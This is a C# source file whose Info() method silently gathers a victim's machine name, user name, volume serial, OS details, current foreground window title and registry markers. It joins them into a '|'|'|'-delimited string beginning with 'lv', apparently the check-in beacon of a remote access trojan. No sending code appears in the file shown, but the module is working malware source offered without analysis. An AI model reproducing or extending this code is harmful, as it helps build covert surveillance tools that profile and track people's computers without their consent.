using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

namespace ty
{
    internal class m
    {
        internal static  string spliter = "|'|'|";

        public static string Info()
        {
            string text = "lv" + spliter;

            string arg890 = text;
            string text2 = "xobyx_reg"; //GRegValue("vn");
            string text3 = ToBase64(text2) + "_" + HardDiskSerial();
            text = arg890 + ToBase64(text3) + spliter;

            try
            {
                text = text + Environment.MachineName + spliter;
            }
            catch (Exception exprCc)
            {

                text = text + "??" + spliter;

            }
            try
            {
                text = text + Environment.UserName + spliter;
            }
            catch (Exception exprFe)
            {

                text = text + "??" + spliter;

            }
            text = text + DateTime.Now.ToString("G") + spliter;
            text = text + "" + spliter;
            try
            {
                text +=
                    Environment.OSVersion.VersionString.Replace("Microsoft", "")
                        .Replace("Windows", "Win")
                        .Replace("®", "")
                        .Replace("™", "")
                        .Replace("  ", " ")
                        .Replace(" Win", "Win");
            }
            catch (Exception expr_1B1)
            {

                text += "??";

            }
            text += "SP";

            try
            {
                string[] array = Environment.OSVersion.ServicePack.Split(new[] {" "}, StringSplitOptions.None);
                if (array.Length == 1)
                {
                    text += "0";
                }
                text += array[array.Length - 1];
            }
            catch (Exception expr_214)
            {

                text += "0";

            }
            try
            {
                if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
                {
                    text = text + " x64" + spliter;
                }
                else
                {
                    text = text + " x86" + spliter;
                }
            }
            catch (Exception expr_267)
            {

                text += spliter;

            }
            //if (Nm.Cam())
            //{
            //    text = text + "Yes" + spliter;
            //}
            //else
            //{
            //    text = text + "No" + spliter;
            //}
            // text = text + VR + spliter;
            text = text + ".." + spliter;
            text = text + WorkedWindowsName() + spliter;
            string text4 = "";
            try
            {
                string[] valueNames =
                    Registry.CurrentUser.CreateSubKey("Software\\" + "x", RegistryKeyPermissionCheck.Default)
                        .GetValueNames();
                for (int i = 0; i < valueNames.Length; i++)
                {
                    string text5 = valueNames[i];
                    if (text5.Length == 32)
                    {
                        text4 = text4 + text5 + ",";
                    }
                }
            }
            catch (Exception expr_345)
            {

            }
            return text + text4;

        }

        public static string ToBase64(string s)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(s);
            return Convert.ToBase64String(bytes);
        }

        public static string FromBase64(string s)
        {
           // s = "eGFz";
            byte[] bytes = Convert.FromBase64String(s);
            return Encoding.UTF8.GetString(bytes);
        }

        internal static string HardDiskSerial()
        {
            string result;
            try
            {
                string text = Environment.GetEnvironmentVariable("SystemDrive") + "\\";
                StringBuilder text2 = new StringBuilder(266);
                int arg_2F_2 = 0;
                uint num = 0;
                int num2 = 0;
                StringBuilder text3 = new StringBuilder(266);
                uint number = 0;
                GetVolumeInformation(text, text2, arg_2F_2, out number, out num, out num2, text3, 0);
                result = String.Format("{0:X}", number);
            }
            catch (Exception expr_3E)
            {
              
                result = "ERR";
                
            }
            return result;
        }


        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool GetVolumeInformation(
            string rootPathName,
            StringBuilder volumeNameBuffer,
            int volumeNameSize,
            out uint volumeSerialNumber,
            out uint maximumComponentLength,
            out int fileSystemFlags,
            StringBuilder fileSystemNameBuffer,
            int nFileSystemNameSize);
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);


        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        public static string WorkedWindowsName()
        {
           
                string result;
                try
                {
                    IntPtr foregroundWindow = GetForegroundWindow();
                    if (foregroundWindow == IntPtr.Zero)
                    {
                        string text = " ";
                        result = ToBase64( text);
                    }
                    else
                    {
                        int windowTextLengthA = GetWindowTextLength( foregroundWindow);
                        StringBuilder text2 = new StringBuilder(windowTextLengthA);
                        GetWindowText(foregroundWindow, text2, windowTextLengthA + 1);
                        uint num = 0;
                        GetWindowThreadProcessId(foregroundWindow, out num);
                        if (num != 0)
                        {
                            try
                            {
                                string text = Process.GetProcessById((int) num).MainWindowTitle;
                                result = ToBase64( text);
                                return result;
                            }
                            catch (Exception expr_74)
                            {
                               
                                result = ToBase64( text2.ToString());
                                
                                return result;
                            }
                        }
                        result = ToBase64( text2.ToString());
                    }
                }
                catch (Exception expr_94)
                {
                   
                    string text = " ";
                    result = ToBase64( text);
                   
                }
                return result;
            }
        
    }
}